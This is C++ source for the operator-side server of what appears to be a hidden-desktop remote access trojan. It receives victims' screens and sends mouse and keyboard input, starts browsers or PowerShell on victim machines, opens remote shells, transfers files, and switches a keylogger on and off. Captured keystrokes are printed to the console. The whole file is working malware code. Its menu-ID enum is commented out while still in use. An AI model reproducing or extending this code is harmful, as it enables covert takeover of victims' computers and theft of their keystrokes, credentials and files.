#include "Common.h"
#include "ControlWindow.h"
#include "Server.h"
#include "_version.h"

#include <thread>
#include <chrono>
#include <iostream>
#include <vector>

typedef NTSTATUS (NTAPI *T_RtlDecompressBuffer)(
    USHORT CompressionFormat,
    PUCHAR UncompressedBuffer,
    ULONG  UncompressedBufferSize,
    PUCHAR CompressedBuffer,
    ULONG  CompressedBufferSize,
    PULONG FinalUncompressedSize
);

static T_RtlDecompressBuffer pRtlDecompressBuffer = nullptr;
enum Connection { desktop, input, end };

struct Client
{
    SOCKET connections[Connection::end];
    DWORD  uhid;            
    HWND   hWnd;            
    BYTE*  pixels;
    DWORD  pixelsWidth, pixelsHeight;
    DWORD  screenWidth, screenHeight;
    HDC    hDcBmp;
    HANDLE minEvent;
    BOOL   fullScreen;
    RECT   windowedRect;

    bool   shellActive;
    bool   keyloggerActive;
};

static const COLORREF gc_trans              = RGB(255, 174, 201);
static const BYTE     gc_magik[]            = { 'M','E','L','T','E','D', 0 };
static const DWORD    gc_maxClients         = 256;
static const DWORD    gc_sleepNotRecvPixels = 33;

static const DWORD    gc_minWindowWidth  = 800;
static const DWORD    gc_minWindowHeight = 600;

 //enum SysMenuIds
//{
  //  fullScreen = 101,
    //startExplorer = WM_USER + 1,
    //startRun,
    //startChrome,
   // startEdge,
  //  startBrave,
   // startFirefox,
  //  startIexplore,
   // startPowershell,

  //  menuShell        = 300, 
  //  menuShellCommand = 301,  
  //  menuFileManager  = 310,  
//    menuDownloadFile = 311, 
 //   menuUploadFile   = 312,
 //   menuKeyloggerOn  = 320,
 //   menuKeyloggerOff = 321
//};

static Client g_clients[gc_maxClients];
static CRITICAL_SECTION g_critSec;

static Client* GetClient(uintptr_t data, BOOL byUhid)
{
    for(int i = 0; i < gc_maxClients; ++i)
    {
        if(byUhid)
        {
            if(g_clients[i].uhid == (DWORD)data)
                return &g_clients[i];
        }
        else
        {
            if((uintptr_t)g_clients[i].hWnd == data)
                return &g_clients[i];
        }
    }
    return nullptr;
}

int SendInt(SOCKET s, int i)
{
    int sent = 0;
    const char* p = reinterpret_cast<const char*>(&i);
    while (sent < sizeof(i))
    {
        int r = send(s, p + sent, sizeof(i) - sent, 0);
        if (r <= 0) return r;         
        sent += r;
    }
    return sent;                       
}

static bool RecvAll(SOCKET s, char* buf, int totalSize)
{
    int got = 0;
    while (got < totalSize)
    {
        int r = recv(s, buf + got, totalSize - got, 0);
        if (r <= 0) return false;
        got += r;
    }
    return true;
}

static int RecvInt(SOCKET s, int& v)          
{
    return RecvAll(s, reinterpret_cast<char*>(&v), sizeof(v))
           ? sizeof(v)
           : 0;
}

static BOOL SendInputMsg(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if(SendInt(s, (int)msg)    <= 0) return FALSE;
    if(SendInt(s, (int)wParam) <= 0) return FALSE;
    if(SendInt(s, (int)lParam) <= 0) return FALSE;
    return TRUE;
}

bool SendPacket(SOCKET s, int opcode, const void* data, int dataSize)
{
    PacketHeader ph;
    ph.opcode   = opcode;
    ph.dataSize = dataSize;

    int r = send(s, (const char*)&ph, sizeof(ph), 0);
    if(r <= 0) return false;

    if(dataSize > 0 && data)
    {
        int sent = 0;
        const char* p = (const char*)data;
        while(sent < dataSize)
        {
            r = send(s, p + sent, dataSize - sent, 0);
            if(r <= 0) return false;
            sent += r;
        }
    }
    return true;
}

bool RecvPacket(SOCKET s, PacketHeader &ph, std::vector<char>& outData)
{
    int r = recv(s, (char*)&ph, sizeof(ph), 0);
    if(r <= 0) return false;
    if(ph.dataSize < 0) return false;
    outData.resize(ph.dataSize);
    int total = 0;
    while(total < ph.dataSize)
    {
        r = recv(s, &outData[0] + total, ph.dataSize - total, 0);
        if(r <= 0) return false;
        total += r;
    }
    return true;
}

static void ToggleFullscreen(HWND hWnd, Client *client)
{
    if(!client->fullScreen)
    {
        RECT rect;
        GetWindowRect(hWnd, &rect);
        client->windowedRect = rect;

        GetWindowRect(GetDesktopWindow(), &rect);

        SetWindowLong(hWnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
        SetWindowPos(hWnd, HWND_TOPMOST,
                     0, 0,
                     rect.right - rect.left,
                     rect.bottom - rect.top,
                     SWP_SHOWWINDOW);
    }
    else
    {
        SetWindowLong(hWnd, GWL_STYLE, WS_OVERLAPPEDWINDOW | WS_VISIBLE);

        int w = client->windowedRect.right  - client->windowedRect.left;
        int h = client->windowedRect.bottom - client->windowedRect.top;
        SetWindowPos(hWnd, HWND_NOTOPMOST,
                     client->windowedRect.left,
                     client->windowedRect.top,
                     w, h,
                     SWP_SHOWWINDOW);
    }
    client->fullScreen = !client->fullScreen;
}

bool SendShellStart(SOCKET s) { return SendPacket(s, OP_SHELL_START, nullptr, 0); }
bool SendShellCommand(SOCKET s, const std::string& cmd) { return SendPacket(s, OP_SHELL_CMD, cmd.data(), (int)cmd.size()); }
bool SendShellStop(SOCKET s) { return SendPacket(s, OP_SHELL_STOP, nullptr, 0); }
bool SendFileList(SOCKET s, const std::string& path) { return SendPacket(s, OP_FILE_LIST, path.data(), (int)path.size()); }
bool SendFileDownload(SOCKET s, const std::string& filename) { return SendPacket(s, OP_FILE_DOWNLOAD, filename.data(), (int)filename.size()); }
bool SendFileUpload(SOCKET s, const std::string& filename) { return SendPacket(s, OP_FILE_UPLOAD, filename.data(), (int)filename.size()); }
bool SendKeyloggerStart(SOCKET s) { return SendPacket(s, OP_KEY_START, nullptr, 0); }
bool SendKeyloggerStop(SOCKET s) { return SendPacket(s, OP_KEY_STOP, nullptr, 0); }

static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    Client *client = GetClient((uintptr_t)hWnd, FALSE);
    if(!client)
        return DefWindowProc(hWnd, msg, wParam, lParam);

    switch(msg)
    {
    case WM_CREATE:
    {
        HMENU hSys = GetSystemMenu(hWnd, false);
        AppendMenu(hSys, MF_SEPARATOR, 0, NULL);
        AppendMenu(hSys, MF_STRING, SysMenuIds::fullScreen,    TEXT("&Fullscreen"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::startExplorer, TEXT("Start Explorer"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::startRun,      TEXT("&Run..."));
        AppendMenu(hSys, MF_STRING, SysMenuIds::startPowershell,TEXT("Start Powershell"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::startChrome,   TEXT("Start Chrome"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::startBrave,    TEXT("Start Brave"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::startEdge,     TEXT("Start Edge"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::startFirefox,  TEXT("Start Firefox"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::startIexplore, TEXT("Start Internet Explorer"));
        AppendMenu(hSys, MF_SEPARATOR, 0, NULL);
        AppendMenu(hSys, MF_STRING, SysMenuIds::menuShell,      TEXT("Open &Shell"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::menuShellCommand,TEXT("Send Shell Command..."));
        AppendMenu(hSys, MF_STRING, SysMenuIds::menuFileManager, TEXT("List Directory..."));
        AppendMenu(hSys, MF_STRING, SysMenuIds::menuDownloadFile, TEXT("Download File..."));
        AppendMenu(hSys, MF_STRING, SysMenuIds::menuUploadFile,   TEXT("Upload File..."));
        AppendMenu(hSys, MF_STRING, SysMenuIds::menuKeyloggerOn,  TEXT("Keylogger Start"));
        AppendMenu(hSys, MF_STRING, SysMenuIds::menuKeyloggerOff, TEXT("Keylogger Stop"));
        break;
    }

    case WM_SYSCOMMAND:
    {
        if(wParam == SC_RESTORE)
        {
            SetEvent(client->minEvent);
        }

        UINT id = (UINT)(wParam & 0xFFF0);

        if(id == SysMenuIds::fullScreen)
        {
            ToggleFullscreen(hWnd, client);
            break;
        }

        if(id == SysMenuIds::startExplorer
        || id == SysMenuIds::startRun
        || id == SysMenuIds::startPowershell
        || id == SysMenuIds::startChrome
        || id == SysMenuIds::startBrave
        || id == SysMenuIds::startEdge
        || id == SysMenuIds::startFirefox
        || id == SysMenuIds::startIexplore)
        {
            EnterCriticalSection(&g_critSec);
            if(!SendInputMsg(client->connections[input], WM_SYSCOMMAND, (WPARAM)id,     0))
                PostQuitMessage(0);
            LeaveCriticalSection(&g_critSec);
            break;
        }

        if(id == SysMenuIds::menuShell)
        {
            EnterCriticalSection(&g_critSec);
            if(!SendShellStart(client->connections[input]))
                PostQuitMessage(0);
            client->shellActive = true;
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuShellCommand)
        {
            if(!client->shellActive)
            {
                MessageBox(hWnd, TEXT("Shell not active. Open Shell first."), TEXT("Info"), MB_OK);
                break;
            }
            char cmd[256]; ZeroMemory(cmd, sizeof(cmd));
            if(IDOK == MessageBoxA(hWnd, "Enter command in console window or implement your own input box.\n(This is demonstration.)", "Shell Command", MB_OKCANCEL))
            {
                strcpy_s(cmd, "dir C:\\");
                EnterCriticalSection(&g_critSec);
                SendShellCommand(client->connections[input], cmd);
                LeaveCriticalSection(&g_critSec);
            }
            break;
        }
        else if(id == SysMenuIds::menuFileManager)
        {
            char path[260] = "C:\\";
            EnterCriticalSection(&g_critSec);
            SendFileList(client->connections[input], path);
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuDownloadFile)
        {
            char fname[260] = "C:\\temp\\test.txt";
            EnterCriticalSection(&g_critSec);
            SendFileDownload(client->connections[input], fname);
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuUploadFile)
        {
            char fname[260] = "C:\\temp\\upload.bin";
            EnterCriticalSection(&g_critSec);
            SendFileUpload(client->connections[input], fname);
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuKeyloggerOn)
        {
            EnterCriticalSection(&g_critSec);
            if(!SendKeyloggerStart(client->connections[input]))
                PostQuitMessage(0);
            client->keyloggerActive = true;
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuKeyloggerOff)
        {
            EnterCriticalSection(&g_critSec);
            if(!SendKeyloggerStop(client->connections[input]))
                PostQuitMessage(0);
            client->keyloggerActive = false;
            LeaveCriticalSection(&g_critSec);
            break;
        }

        return DefWindowProc(hWnd, msg, wParam, lParam);
    }

    case WM_COMMAND:
    {
        UINT id = LOWORD(wParam);

        if(id == SysMenuIds::fullScreen)
        {
            ToggleFullscreen(hWnd, client);
            break;
        }

        if(id == SysMenuIds::startExplorer
        || id == SysMenuIds::startRun
        || id == SysMenuIds::startPowershell
        || id == SysMenuIds::startChrome
        || id == SysMenuIds::startBrave
        || id == SysMenuIds::startEdge
        || id == SysMenuIds::startFirefox
        || id == SysMenuIds::startIexplore)
        {
            EnterCriticalSection(&g_critSec);
            if(!SendInputMsg(client->connections[input], WM_COMMAND, (WPARAM)id, 0))
                PostQuitMessage(0);
            LeaveCriticalSection(&g_critSec);
            break;
        }

        if(id == SysMenuIds::menuShell)
        {
            EnterCriticalSection(&g_critSec);
            if(!SendShellStart(client->connections[input]))
                PostQuitMessage(0);
            client->shellActive = true;
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuShellCommand)
        {
            if(!client->shellActive)
            {
                MessageBox(hWnd, TEXT("Shell not active. Open Shell first."), TEXT("Info"), MB_OK);
                break;
            }
            char cmd[256] = {0};
            if(IDOK == MessageBoxA(hWnd, "Enter command in console window or implement your own input box.\n(This is demonstration.)", "Shell Command", MB_OKCANCEL))
            {
                strcpy_s(cmd, "dir C:\\");
                EnterCriticalSection(&g_critSec);
                SendShellCommand(client->connections[input], cmd);
                LeaveCriticalSection(&g_critSec);
            }
            break;
        }
        else if(id == SysMenuIds::menuFileManager)
        {
            char path[260] = "C:\\";
            EnterCriticalSection(&g_critSec);
            SendFileList(client->connections[input], path);
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuDownloadFile)
        {
            char fname[260] = "C:\\temp\\test.txt";
            EnterCriticalSection(&g_critSec);
            SendFileDownload(client->connections[input], fname);
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuUploadFile)
        {
            char fname[260] = "C:\\temp\\upload.bin";
            EnterCriticalSection(&g_critSec);
            SendFileUpload(client->connections[input], fname);
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuKeyloggerOn)
        {
            EnterCriticalSection(&g_critSec);
            if(!SendKeyloggerStart(client->connections[input]))
                PostQuitMessage(0);
            client->keyloggerActive = true;
            LeaveCriticalSection(&g_critSec);
            break;
        }
        else if(id == SysMenuIds::menuKeyloggerOff)
        {
            EnterCriticalSection(&g_critSec);
            if(!SendKeyloggerStop(client->connections[input]))
                PostQuitMessage(0);
            client->keyloggerActive = false;
            LeaveCriticalSection(&g_critSec);
            break;
        }
        break;
    }

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hDc = BeginPaint(hWnd, &ps);

        RECT clientRect;
        GetClientRect(hWnd, &clientRect);
        int dstWidth  = clientRect.right  - clientRect.left;
        int dstHeight = clientRect.bottom - clientRect.top;

        HBRUSH hBrush = CreateSolidBrush(RGB(0,0,0));
        FillRect(hDc, &clientRect, hBrush);
        DeleteObject(hBrush);

        if(client->pixelsWidth && client->pixelsHeight)
        {
            SetStretchBltMode(hDc, HALFTONE);
            StretchBlt(hDc,
                       0, 0,
                       dstWidth, dstHeight,
                       client->hDcBmp,
                       0, 0,
                       client->pixelsWidth,
                       client->pixelsHeight,
                       SRCCOPY);
        }

        EndPaint(hWnd, &ps);
        break;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    case WM_ERASEBKGND:
        return TRUE;

    case WM_LBUTTONDOWN:
    case WM_LBUTTONUP:
    case WM_RBUTTONDOWN:
    case WM_RBUTTONUP:
    case WM_MBUTTONDOWN:
    case WM_MBUTTONUP:
    case WM_LBUTTONDBLCLK:
    case WM_RBUTTONDBLCLK:
    case WM_MBUTTONDBLCLK:
    case WM_MOUSEMOVE:
    case WM_MOUSEWHEEL:
    {
        if(msg == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
            break;

        int x = GET_X_LPARAM(lParam);
        int y = GET_Y_LPARAM(lParam);

        float ratioX = (float)client->screenWidth  / (float)client->pixelsWidth;
        float ratioY = (float)client->screenHeight / (float)client->pixelsHeight;

        x = (int)(x * ratioX);
        y = (int)(y * ratioY);
        LPARAM newLP = MAKELPARAM(x,y);

        EnterCriticalSection(&g_critSec);
        if(!SendInputMsg(client->connections[input], msg, wParam, newLP))
            PostQuitMessage(0);
        LeaveCriticalSection(&g_critSec);
        break;
    }

    case WM_CHAR:
    {
        if(iscntrl((int)wParam)) break;
        EnterCriticalSection(&g_critSec);
        if(!SendInputMsg(client->connections[input], msg, wParam, 0))
            PostQuitMessage(0);
        LeaveCriticalSection(&g_critSec);
        break;
    }

    case WM_KEYDOWN:
    case WM_KEYUP:
    {
        switch(wParam)
        {
        case VK_UP: case VK_DOWN: case VK_LEFT: case VK_RIGHT:
        case VK_HOME: case VK_END: case VK_PRIOR: case VK_NEXT:
        case VK_INSERT: case VK_DELETE: case VK_RETURN: case VK_BACK:
            break;
        default:
            return 0;
        }
        EnterCriticalSection(&g_critSec);
        if(!SendInputMsg(client->connections[input], msg, wParam, 0))
            PostQuitMessage(0);
        LeaveCriticalSection(&g_critSec);
        break;
    }

    case WM_GETMINMAXINFO:
    {
        MINMAXINFO* mmi = (MINMAXINFO*)lParam;
        mmi->ptMinTrackSize.x = gc_minWindowWidth;
        mmi->ptMinTrackSize.y = gc_minWindowHeight;
        if(client)
        {
            mmi->ptMaxTrackSize.x = (LONG)client->screenWidth;
            mmi->ptMaxTrackSize.y = (LONG)client->screenHeight;
        }
        break;
    }

    default:
        return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

static DWORD WINAPI AdvancedInputThread(LPVOID lpParam);

static DWORD WINAPI ClientThread(PVOID param)
{
    SOCKET s = (SOCKET)param;
    BYTE   buf[sizeof(gc_magik)];
    Connection connection;
    DWORD  uhid;
    Client *client = nullptr;

    if(recv(s, (char*)buf, sizeof(gc_magik), 0) <= 0)
    {
        closesocket(s);
        return 0;
    }
    if(memcmp(buf, gc_magik, sizeof(gc_magik)) != 0)
    {
        closesocket(s);
        return 0;
    }
    if(recv(s, (char*)&connection, sizeof(connection), 0) <= 0)
    {
        closesocket(s);
        return 0;
    }
    {
        SOCKADDR_IN addr;
        int asz = sizeof(addr);
        getpeername(s, (SOCKADDR*)&addr, &asz);
        uhid = addr.sin_addr.S_un.S_addr;
    }
    if(connection == desktop)
    {
        client = GetClient((uintptr_t)uhid, TRUE);
        if(!client)
        {
            printf("[desktop] No existing client slot for this uhid=%lu. Closing.\n", (unsigned long)uhid);
            closesocket(s);
            return 0;
        }
        client->connections[desktop] = s;
        printf("[desktop] Connection established for IP=%lu (uhid).\n", (unsigned long)uhid);

        BITMAPINFO bmpInfo = {};
        bmpInfo.bmiHeader.biSize        = sizeof(bmpInfo.bmiHeader);
        bmpInfo.bmiHeader.biPlanes      = 1;
        bmpInfo.bmiHeader.biBitCount    = 24;
        bmpInfo.bmiHeader.biCompression = BI_RGB;

        for(;;)
        {
            RECT rr;
            GetClientRect(client->hWnd, &rr);
            printf("[desktop] Loop: client->hWnd rect=(%ld,%ld)\n", rr.right, rr.bottom);

            if(rr.right == 0)
            {
                ResetEvent(client->minEvent);
                WaitForSingleObject(client->minEvent, 5000);
                continue;
            }

            int realRight  = (rr.right  > (LONG)client->screenWidth  && client->screenWidth  > 0)
                             ? client->screenWidth
                             : rr.right;
            int realBottom = (rr.bottom > (LONG)client->screenHeight && client->screenHeight > 0)
                             ? client->screenHeight
                             : rr.bottom;
            if((realRight * 3) % 4)
                realRight += ((realRight*3)%4);

            if(SendInt(s, realRight) <= 0) goto desktop_exit;
            if(SendInt(s, realBottom)<= 0) goto desktop_exit;

            BOOL recvPixels=false;
            if(recv(s, (char*)&recvPixels, sizeof(recvPixels), 0) <= 0) goto desktop_exit;
            if(!recvPixels)
            {
                Sleep(gc_sleepNotRecvPixels);
                continue;
            }
            if(recv(s, (char*)&client->screenWidth,  sizeof(client->screenWidth), 0) <= 0) goto desktop_exit;
            if(recv(s, (char*)&client->screenHeight, sizeof(client->screenHeight),0) <= 0) goto desktop_exit;

            DWORD width, height, size;
            if(recv(s, (char*)&width,  sizeof(width),  0) <= 0) goto desktop_exit;
            if(recv(s, (char*)&height, sizeof(height), 0) <= 0) goto desktop_exit;
            if(recv(s, (char*)&size,   sizeof(size),   0) <= 0) goto desktop_exit;

            BYTE* compressedPixels = (BYTE*)malloc(size);
            if(!compressedPixels) goto desktop_exit;

            int totalRead = 0;
            while(totalRead < (int)size)
            {
                int rr2 = recv(s, (char*)compressedPixels + totalRead, size - totalRead, 0);
                if(rr2 <= 0)
                {
                    free(compressedPixels);
                    goto desktop_exit;
                }
                totalRead += rr2;
            }

            EnterCriticalSection(&g_critSec);
            {
                DWORD newPixelsSize = width * 3 * height;
                BYTE* newPixels = (BYTE*)malloc(newPixelsSize);
                if(!newPixels)
                {
                    free(compressedPixels);
                    LeaveCriticalSection(&g_critSec);
                    goto desktop_exit;
                }
                pRtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,
                                     newPixels,
                                     newPixelsSize,
                                     compressedPixels,
                                     size,
                                     &size);
                free(compressedPixels);

                if(client->pixels && client->pixelsWidth==width && client->pixelsHeight==height)
                {
                    for(DWORD i=0;i<newPixelsSize;i+=3)
                    {
                        if(newPixels[i]==GetRValue(gc_trans) &&
                           newPixels[i+1]==GetGValue(gc_trans) &&
                           newPixels[i+2]==GetBValue(gc_trans))
                        {
                            continue;
                        }
                        client->pixels[i]  = newPixels[i];
                        client->pixels[i+1]= newPixels[i+1];
                        client->pixels[i+2]= newPixels[i+2];
                    }
                    free(newPixels);
                }
                else
                {
                    free(client->pixels);
                    client->pixels = newPixels;
                }

                HDC hDc = GetDC(NULL);
                HDC hDcBmp = CreateCompatibleDC(hDc);
                HBITMAP hBmp = CreateCompatibleBitmap(hDc, width, height);
                SelectObject(hDcBmp, hBmp);

                bmpInfo.bmiHeader.biWidth      = (LONG)width;
                bmpInfo.bmiHeader.biHeight     = (LONG)height;
                bmpInfo.bmiHeader.biSizeImage  = width*3*height;

                SetDIBits(hDcBmp,
                          hBmp,
                          0,
                          height,
                          client->pixels,
                          &bmpInfo,
                          DIB_RGB_COLORS);

                DeleteDC(client->hDcBmp);
                client->pixelsWidth  = width;
                client->pixelsHeight = height;
                client->hDcBmp       = hDcBmp;

                InvalidateRgn(client->hWnd, NULL, TRUE);

                DeleteObject(hBmp);
                ReleaseDC(NULL, hDc);
            }
            LeaveCriticalSection(&g_critSec);

            if(SendInt(s, 0) <= 0) goto desktop_exit;
        }
desktop_exit:
        PostMessage(client->hWnd, WM_DESTROY,0,0);
        return 0;
    }
    else if(connection == input)
    {
        char ip[16] = {0};
        EnterCriticalSection(&g_critSec);
        {
            client = GetClient((uintptr_t)uhid, TRUE);
            if(client)
            {
                closesocket(s);
                LeaveCriticalSection(&g_critSec);
                return 0;
            }
            BOOL foundSlot = FALSE;
            for(int i=0; i<gc_maxClients; i++)
            {
                if(!g_clients[i].hWnd)
                {
                    client = &g_clients[i];
                    foundSlot = TRUE;
                    break;
                }
            }
            if(!foundSlot)
            {
                closesocket(s);
                LeaveCriticalSection(&g_critSec);
                return 0;
            }

            client->uhid = uhid;
            client->connections[input] = s;
            IN_ADDR a;
            a.S_un.S_addr = uhid;
            strcpy_s(ip, inet_ntoa(a));

            wprintf(TEXT("[+] New Connection: %S\n"), ip);

            client->hWnd = CW_Create(uhid, gc_minWindowWidth, gc_minWindowHeight);
            client->minEvent = CreateEventA(NULL, TRUE, FALSE, NULL);

            client->shellActive = false;
            client->keyloggerActive = false;
        }
        LeaveCriticalSection(&g_critSec);

        SendInt(s,0);

        HANDLE advThread = CreateThread(NULL, 0, AdvancedInputThread, (LPVOID)client, 0, NULL);
        if(advThread) CloseHandle(advThread);

        MSG msg;
        while(GetMessage(&msg, NULL, 0,0) > 0)
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        EnterCriticalSection(&g_critSec);
        {
            wprintf(TEXT("[!] Client %S Disconnected\n"), ip);

            free(client->pixels);
            DeleteDC(client->hDcBmp);
            closesocket(client->connections[input]);
            if(client->connections[desktop] != INVALID_SOCKET)
                closesocket(client->connections[desktop]);

            CloseHandle(client->minEvent);
            memset(client, 0, sizeof(*client));
        }
        LeaveCriticalSection(&g_critSec);
    }

    return 0;
}

static DWORD WINAPI AdvancedInputThread(LPVOID lpParam)
{
    Client* client = (Client*) lpParam;
    SOCKET s = client->connections[input];

    for(;;)
    {
        PacketHeader ph;
        std::vector<char> data;
        if(!RecvPacket(s, ph, data))
        {
            return 0;
        }

        EnterCriticalSection(&g_critSec);
        {
            switch(ph.opcode)
            {
            case OP_SHELL_OUTPUT:
                {
                    std::string out(data.begin(), data.end());
                    printf("[Shell Output from %lu]:\n%s\n", (unsigned long)client->uhid, out.c_str());
                }
                break;

            case OP_FILE_LISTRES:
                {
                    std::string listing(data.begin(), data.end());
                    printf("[File List from %lu]:\n%s\n", (unsigned long)client->uhid, listing.c_str());
                }
                break;

            case OP_FILE_DATA:
                {
                    printf("[File Data %d bytes from %lu]\n", ph.dataSize, (unsigned long)client->uhid);
                }
                break;

            case OP_FILE_DONE:
                {
                    printf("[File Transfer Done from %lu]\n", (unsigned long)client->uhid);
                }
                break;

            case OP_KEY_DATA:
                {
                    std::string keys(data.begin(), data.end());
                    printf("[Keylogger %lu] %s\n", (unsigned long)client->uhid, keys.c_str());
                }
                break;

            default:
                {
                    printf("[!] Unknown opcode=%d from client %lu\n", ph.opcode, (unsigned long)client->uhid);
                }
                break;
            }
        }
        LeaveCriticalSection(&g_critSec);
    }

    return 0;
}

BOOL StartServer(int port)
{
    WSADATA wsa;
    sockaddr_in addr;

    HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
    if(!ntdll)
    {
        wprintf(TEXT("[!] Cannot load ntdll.dll\n"));
        return FALSE;
    }
    pRtlDecompressBuffer = (T_RtlDecompressBuffer)GetProcAddress(ntdll, "RtlDecompressBuffer");
    if(!pRtlDecompressBuffer)
    {
        wprintf(TEXT("[!] Cannot get RtlDecompressBuffer\n"));
        FreeLibrary(ntdll);
        return FALSE;
    }

    static bool csInited = false;
    if(!csInited)
    {
        InitializeCriticalSection(&g_critSec);
        csInited = true;
    }

    ZeroMemory(g_clients, sizeof(g_clients));

    CW_Register(WndProc);

    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        wprintf(TEXT("[!] WSAStartup error\n"));
        return FALSE;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if(serverSocket==INVALID_SOCKET)
    {
        wprintf(TEXT("[!] socket() error\n"));
        return FALSE;
    }

    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(port);

    if(bind(serverSocket, (sockaddr*)&addr, sizeof(addr))==SOCKET_ERROR)
    {
        wprintf(TEXT("[!] bind() error\n"));
        closesocket(serverSocket);
        return FALSE;
    }
    if(listen(serverSocket, SOMAXCONN)==SOCKET_ERROR)
    {
        wprintf(TEXT("[!] listen() error\n"));
        closesocket(serverSocket);
        return FALSE;
    }

    int addrSize = sizeof(addr);
    getsockname(serverSocket, (sockaddr*)&addr, &addrSize);
    wprintf(TEXT("[+] Listening on Port: %d\n\n"), ntohs(addr.sin_port));

    for(;;)
    {
        sockaddr_in caddr;
        int caddrSize = sizeof(caddr);
        SOCKET s = accept(serverSocket, (sockaddr*)&caddr, &caddrSize);
        if(s==INVALID_SOCKET)
        {
            wprintf(TEXT("[!] accept failed\n"));
            continue;
        }
        HANDLE hThread = CreateThread(NULL, 0, ClientThread, (LPVOID)s, 0, NULL);
        if(!hThread)
        {
            wprintf(TEXT("[!] CreateThread() failed\n"));
            closesocket(s);
        }
        else
        {
            CloseHandle(hThread);
        }
    }

    return TRUE;
}
